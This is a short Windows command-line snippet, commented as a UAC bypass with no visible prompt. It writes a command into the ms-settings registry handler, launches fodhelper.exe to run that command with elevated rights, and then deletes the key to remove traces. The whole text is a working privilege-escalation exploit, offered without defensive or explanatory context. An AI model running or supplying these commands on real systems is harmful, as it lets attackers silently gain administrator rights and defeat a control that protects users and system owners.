# This bypasses UAC without any visible prompt
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe /c %1" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
start fodhelper.exe
timeout 3
reg delete "HKCU\Software\Classes\ms-settings\" /f
